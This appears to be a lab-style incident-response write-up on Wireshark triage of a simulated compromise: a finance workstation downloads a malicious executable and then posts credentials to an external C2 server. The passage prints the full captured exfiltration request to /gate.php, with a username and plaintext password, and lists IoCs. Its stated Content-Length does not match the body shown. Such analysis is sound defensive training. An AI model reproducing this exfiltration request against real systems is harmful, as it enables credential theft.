# Incident Response Triage Write-Up: Unauthorized HTTP Data Exfiltration

**Analyst:** Kadiri Olumuyiwa 
**Date:** June 2026  
**Ticket ID:** IR-2026-0614  
**Severity:** High  
**Status:** Escalated to Tier 2 / Host Contained  

---

## 1. Executive Summary

At 14:22 UTC, the network Intrusion Detection System (IDS) flagged anomalous outbound traffic originating from an internal Finance Department workstation (`192.168.10.45`). A raw packet capture (`LAN_seg_B.pcap`) was extracted for forensic triage. Analysis via Wireshark confirmed that a user workstation was compromised via an unencrypted HTTP download, resulting in the cleartext exfiltration of internal user credentials to an external Command and Control (C2) server.

---

## 2. Investigation Environment & Filters Applied

* **Forensic Tool:** Wireshark v4.2.x
* **Capture File:** `LAN_seg_B.pcap` (Simulated Enterprise Network Capture)
* **Primary Display Filters Used:**
  * `http.request.method == "POST"` *(Used to isolate outgoing data transmissions)*
  * `ip.addr == 192.168.10.45` *(Used to isolate the compromised workstation)*
  * `dns` *(Used to trace the initial domain lookup)*

---

## 3. Indicators of Compromise (IoCs)

| Artifact Category | Identified Data Point | Context |
| :--- | :--- | :--- |
| **Compromised Internal Host** | `192.168.10.45` | MAC: `00:0c:29:ab:88:f1` (Hostname: `FIN-WS-04`) |
| **Malicious External IP** | `185.220.101.42` | Unsanctioned external server |
| **Defanged Malicious Domain** | `update-system-patch[.]com` | Uncategorized newly registered domain |
| **Target Port** | `TCP 80` (HTTP) | Unencrypted web traffic |
| **Malicious Payload** | `invoice_scanner.exe` | Executable file downloaded via GET request |

---

## 4. Chronological Timeline of Attack

1. **14:22:01 UTC — Initial DNS Resolution:**  
   Host `192.168.10.45` sends a standard UDP DNS query to resolve `update-system-patch[.]com`. 
2. **14:22:03 UTC — TCP Handshake Established:**  
   A standard 3-Way Handshake (`SYN` $\rightarrow$ `SYN-ACK` $\rightarrow$ `ACK`) is completed between the internal workstation and the external IP `185.220.101.42` over Port 80.
3. **14:22:04 UTC — Malicious Ingestion:**  
   The internal host issues an `HTTP GET` request for `/downloads/invoice_scanner.exe`. The external server returns an `HTTP 200 OK` followed by the binary payload stream.
4. **14:23:15 UTC — Credential Exfiltration:**  
   The compromised host issues an `HTTP POST` request to `/gate.php`. 

---

## 5. Deep-Dive Packet Analysis (Proof of Work)

By inspecting Packet `#412` and executing Wireshark's **"Follow $\rightarrow$ HTTP Stream"** function, the contents of the outbound `POST` request were revealed in cleartext:

```text
POST /gate.php HTTP/1.1
Host: update-system-patch[.]com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

sys_user=j.doe&domain=BOTIUM_INT&pass=Summer2026!
